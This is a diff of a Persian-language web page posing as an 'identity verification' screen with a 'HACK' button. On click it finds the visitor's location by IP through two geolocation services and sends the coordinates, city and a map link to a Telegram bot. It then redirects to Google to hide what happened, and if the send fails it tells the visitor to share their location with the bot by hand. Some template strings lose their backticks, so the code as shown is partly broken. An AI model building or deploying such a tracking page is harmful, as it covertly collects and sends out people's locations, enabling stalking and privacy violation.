@@ -1,4 +1,3 @@
-`html
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
@@ -8,24 +7,26 @@
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial;direction:rtl}
-        .container{background:#111;padding:40px;border-radius:20px;border:1px solid #0f0;text-align:center;max-width:400px;width:90%}
-        h1{color:#0f0;font-size:22px;margin-bottom:15px}
-        .sub{color:#888;font-size:14px;margin-bottom:25px}
-        .btn{background:transparent;border:2px solid #0f0;color:#0f0;padding:15px 40px;font-size:22px;border-radius:50px;cursor:pointer;width:100%;transition:0.3s}
+        .container{background:#111;padding:30px;border-radius:20px;border:1px solid #0f0;text-align:center;max-width:420px;width:95%}
+        h1{color:#0f0;font-size:20px;margin-bottom:10px}
+        .sub{color:#888;font-size:13px;margin-bottom:20px}
+        .btn{background:transparent;border:2px solid #0f0;color:#0f0;padding:14px 30px;font-size:20px;border-radius:50px;cursor:pointer;width:100%;transition:0.3s;font-weight:bold}
         .btn:hover{background:#0f0;color:#000}
         .btn:disabled{opacity:0.3;cursor:not-allowed}
         #status{color:#0f0;margin-top:15px;font-size:14px;min-height:25px}
-        #log{background:#1a1a1a;padding:10px;margin-top:15px;border-radius:8px;font-size:12px;color:#0f0;text-align:left;font-family:monospace;min-height:50px;max-height:200px;overflow:auto;border:1px solid #333}
+        #log{background:#1a1a1a;padding:10px;margin-top:15px;border-radius:8px;font-size:12px;color:#0f0;text-align:left;font-family:monospace;min-height:60px;max-height:200px;overflow:auto;border:1px solid #333;direction:ltr}
         .error{color:#f44}
-        .manual-link{display:block;margin-top:15px;color:#0f0;font-size:14px;word-break:break-all}
-        .manual-link a{color:#0f0;text-decoration:underline}
+        .manual-box{background:#1a1a1a;border:1px solid #f44;padding:15px;margin-top:15px;border-radius:10px}
+        .manual-box a{color:#0f0;font-size:16px;display:block;margin:10px 0;text-decoration:underline}
+        .manual-box .hint{color:#888;font-size:12px}
+        .success-box{background:#1a1a1a;border:1px solid #0f0;padding:15px;margin-top:15px;border-radius:10px;color:#0f0}
     </style>
 </head>
 <body>
 <div class="container">
     <h1>⛔ تأیید هویت</h1>
     <div class="sub">برای ادامه، کلیک کنید</div>
-    <button class="btn" id="hackBtn" onclick="handleClick()">HACK</button>
+    <button class="btn" id="hackBtn" onclick="handleHack()">HACK</button>
     <div id="status">✅ آماده</div>
     <div id="log">⏳ منتظر کلیک...</div>
 </div>
@@ -53,15 +54,34 @@ function addLog(msg, isError = false) {
     console.log(msg);
 }
 
-// ===== دریافت موقعیت (فقط IP، همیشه کار می‌کند) =====
+// ===== دریافت موقعیت از IP (با ۲ سرویس مختلف) =====
 async function getLocation() {
-    addLog('🌐 دریافت موقعیت از IP...');
+    // سرویس اول: geoplugin (معمولاً در ایران کار می‌کند)
     try {
-        const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
+        addLog('🌐 تلاش geoplugin...');
+        const res = await fetch('https://geoplugin.net/json.gp', { signal: AbortSignal.timeout(4000) });
         const data = await res.json();
-        addLog('📡 پاسخ دریافت شد');
+        if (data.geoplugin_latitude && data.geoplugin_latitude != '0') {
+            addLog('✅ موقعیت از geoplugin دریافت شد');
+            return {
+                lat: parseFloat(data.geoplugin_latitude),
+                lon: parseFloat(data.geoplugin_longitude),
+                city: data.geoplugin_city || 'نامشخص',
+                country: data.geoplugin_countryName || 'نامشخص',
+                method: 'GeoPlugin'
+            };
+        }
+    } catch(e) {
+        addLog('❌ geoplugin خطا: ' + e.message, true);
+    }
+
+    // سرویس دوم: ip-api (پشتیبان)
+    try {
+        addLog('🌐 تلاش ip-api...');
+        const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(4000) });
+        const data = await res.json();
         if (data.status === 'success') {
-            addLog(`✅ موقعیت: ${data.lat}, ${data.lon}`);
+            addLog('✅ موقعیت از ip-api دریافت شد');
             return {
                 lat: data.lat,
                 lon: data.lon,
@@ -69,28 +89,26 @@ async function getLocation() {
                 country: data.country,
                 method: 'IP-API'
             };
-        } else {
-            addLog('❌ وضعیت ناموفق: ' + data.message, true);
-            return null;
         }
     } catch(e) {
-        addLog('❌ خطا: ' + e.message, true);
-        return null;
+        addLog('❌ ip-api خطا: ' + e.message, true);
     }
+
+    return null;
 }
 
 // ===== ارسال به تلگرام =====
 async function sendToTelegram(loc) {
     const text = 
-`📍 موقعیت جدید:
+📍 موقعیت جدید:
 🌐 عرض: ${loc.lat}
 🌐 طول: ${loc.lon}
 🏙 شهر: ${loc.city || 'نامشخص'}
 🌍 کشور: ${loc.country || 'نامشخص'}
 📡 روش: ${loc.method}
-🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
+🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};
 
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
     addLog('📤 ارسال به تلگرام...');
     try {
         const res = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
@@ -108,60 +126,74 @@ async function sendToTelegram(loc) {
     }
 }
 
-// ===== تابع اصلی =====
-async function handleClick() {
-    addLog('🚀 شروع...');
+// ===== نمایش گزینه دستی =====
+function showManualOption() {
+    const botUsername = BOT_TOKEN.split(':')[0];
+    const manualHtml = 
+        <div class="manual-box">
+            <div style="color:#f44;font-size:14px;margin-bottom:10px">⚠️ ارسال خودکار ممکن نیست</div>
+            <a href="https://t.me/${botUsername}" target="_blank">📱 باز کردن بات در تلگرام</a>
+            <div class="hint">پس از باز شدن بات، دکمه 📎 را بزنید و <b>Location</b> را انتخاب کنید.</div>
+            <div class="hint" style="margin-top:5px;color:#666">یا روی لینک زیر کلیک کنید:</div>
+            <a href="tg://resolve?domain=${botUsername}" style="font-size:13px;color:#888">tg://resolve?domain=${botUsername}</a>
+        </div>
+    ;
+    logEl.insertAdjacentHTML('beforeend', manualHtml);
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+// ===== نمایش پیام موفقیت =====
+function showSuccess() {
+    const successHtml = 
+        <div class="success-box">
+            ✅ موقعیت با موفقیت ارسال شد!
+        </div>
+    ;
+    logEl.insertAdjacentHTML('beforeend', successHtml);
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+// ===== تابع اصلی (با کلیک دکمه) =====
+async function handleHack() {
+    addLog('🚀 شروع فرآیند...');
     btn.disabled = true;
+    btn.style.opacity = '0.3';
     setStatus('⏳ در حال پردازش...');
 
     const loc = await getLocation();
 
     if (!loc) {
         setStatus('❌ موقعیت دریافت نشد', true);
-        addLog('❌ پایان با خطا', true);
-        btn.disabled = false;
-        // نمایش لینک دستی به عنوان راهکار جایگزین
+        addLog('❌ هیچ موقعیتی دریافت نشد', true);
         showManualOption();
+        btn.disabled = false;
+        btn.style.opacity = '1';
         return;
     }
 
     setStatus(✅ موقعیت: ${loc.lat}, ${loc.lon});
+    addLog(✅ موقعیت نهایی: ${loc.lat}, ${loc.lon} (${loc.method}));
+
     const sent = await sendToTelegram(loc);
 
     if (sent) {
-        setStatus('✅ موقعیت ارسال شد!');
+        setStatus('✅ ارسال شد!');
+        showSuccess();
         addLog('⏳ ریدایرکت در ۲ ثانیه...');
         setTimeout(() => {
             window.location.href = 'https://www.google.com';
         }, 2000);
     } else {
         setStatus('⚠️ ارسال خودکار ناموفق', true);
+        addLog('⚠️ ارسال به تلگرام ناموفق بود', true);
         showManualOption();
+        btn.disabled = false;
+        btn.style.opacity = '1';
     }
 }
 
-// ===== گزینه دستی (در صورت شکست خودکار) =====
-function showManualOption() {
-    const manualDiv = document.createElement('div');
-    manualDiv.className = 'manual-link';
-    manualDiv.innerHTML = 
-        <p style="color:#888;font-size:13px;margin-top:10px">
-        ⚠️ ارسال خودکار ممکن نیست.<br>
-        لطفاً روی لینک زیر کلیک کنید و موقعیت خود را بفرستید:
-        </p>
-        <a href="https://t.me/${BOT_TOKEN.split(':')[0]}" target="_blank">
-            📱 ارسال موقعیت به بات
-        </a>
-        <p style="color:#666;font-size:11px;margin-top:10px">
-        (بعد از باز شدن بات، دکمه 📎 را بزنید و Location را انتخاب کنید)
-        </p>
-    ;
-    logEl.appendChild(manualDiv);
-    btn.disabled = false;
-    setStatus('⚠️ لطفاً دستی ارسال کنید', true);
-}
-
-addLog('✅ صفحه آماده است. دکمه را بزنید.');
+// ===== پیام اولیه =====
+addLog('✅ صفحه بارگذاری شد. دکمه را بزنید.');
 </script>
 </body>
 </html>
